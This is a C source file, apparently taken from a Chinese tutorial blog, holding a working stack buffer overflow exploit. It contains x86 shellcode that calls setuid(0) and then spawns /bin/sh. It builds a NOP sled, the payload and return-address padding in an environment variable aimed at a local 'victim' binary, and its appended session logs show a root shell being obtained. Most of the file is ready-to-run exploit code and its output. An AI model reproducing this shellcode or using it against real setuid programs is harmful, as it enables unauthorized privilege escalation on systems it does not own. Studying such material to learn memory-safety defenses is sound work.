// file: exploit_victim.c    
// http://blog.csdn.net/azloong/article/details/6158478

#include <stdio.h>    
#include <string.h>
#include <stdlib.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512 //默认缓冲区大小，与victim.c缓冲区大小一致    
#define NOP 0x90 //空操作指令OP码    
#define NO_DEBUG    

#ifdef NO_DEBUG    
#define DPRINTF(a,...)    
#else    
#define DPRINTF printf    
#endif    

char shellcode[] = 
"\xeb\x29"
"\x31\xc0" // setuid(0);
"\xb0\x17"
"\x31\xdb"
"\xcd\x80"
"\x31\xc0" // execve("//bin/sh", ["//bin/sh"], NULL);
"\x50"
"\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x31\xd2"
"\xb0\x0b"
"\xcd\x80"
"\x31\xdb"
"\x31\xc0"
"\xb0\x01"
"\xcd\x80"
"\xe8\xd2\xff\xff\xff";

unsigned long find_esp()    
{    
	__asm__("movl %esp, %eax");    
}    

void main(int argc, char *argv[])    
{    
	char *buff, *ptr;    
	long *paddr, addr;    
	int bsize = DEFAULT_BUFFER_SIZE;
	int offset = DEFAULT_OFFSET;
	int i;

	if (argc > 1) bsize = atoi(argv[1]);
	if (argc > 2) offset = atoi(argv[2]);
	if (bsize < strlen(shellcode)) {    
		printf("Buffer size is too small.\n");    
		exit(1);
	}    

	if (!(buff = malloc(bsize))) {    
		printf("Can't allocate memory.\n");    
		exit(1);    
	}    

	addr = find_esp() + offset;
	printf("Using address: 0x%08x\n", addr);    

	ptr = buff;
	DPRINTF("\n\n");
	DPRINTF("Fill buff with NOP:\n");    
	for (i = 0; i < (bsize/2 - strlen(shellcode)/2); i++) {    
		*(ptr++) = NOP;    
		if ((i%0x10) == 0) DPRINTF("\n");    
		DPRINTF("%02x ", *(long *)(ptr-1));    
	}    

	DPRINTF("\n\n");        
	DPRINTF("Fill buff with shellcode:\n");    
	for (i = 0; i < strlen(shellcode); i++) {    
		*(ptr++) = shellcode[i];    
		if ((i%0x10) == 0) DPRINTF("\n");    
		DPRINTF("%02x ", *(long *)(ptr-1));    
	}    

	DPRINTF("\n\n");    
	DPRINTF("Fill buff with ret address:\n");    
	for (i = 0; ptr < &buff[bsize-1]; ptr += 4, i++) {    
		*(long *)ptr = addr;    
		if ((i%0x8) == 0) DPRINTF("\n");    
		DPRINTF("%08x ", *(long *)ptr);    
	}    
	DPRINTF("\n\n");    

	buff[bsize - 1] = '\0';    

	memcpy(buff, "BUF=", 4);    
	putenv(buff);    
	system("/bin/bash");    
}

/*
 * chasond@centos_12 ~/linux-debug/shellcode
 * $./exploit_victim 600 600
 * Using address: 0xbffff260
 * [chasond@centos_12 shellcode]$ ./victim $BUF
 * sh-4.1$ 
 * sh-4.1$ exit
 * exit
 * [chasond@centos_12 shellcode]$ exit
 * exit
 *
 * chasond@centos_12 ~/linux-debug/shellcode
 * $
 * 
 */

//
// chasond@centos_12 ~/linux-debug/shellcode
// $./exploit_victim 1000 512
// Using address: 0xbffff208
// [chasond@centos_12 shellcode]$ ./victim $BUF
// sh-4.1# id
// uid=0(root) gid=19(floppy) groups=0(root),19(floppy) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
// sh-4.1# 
//


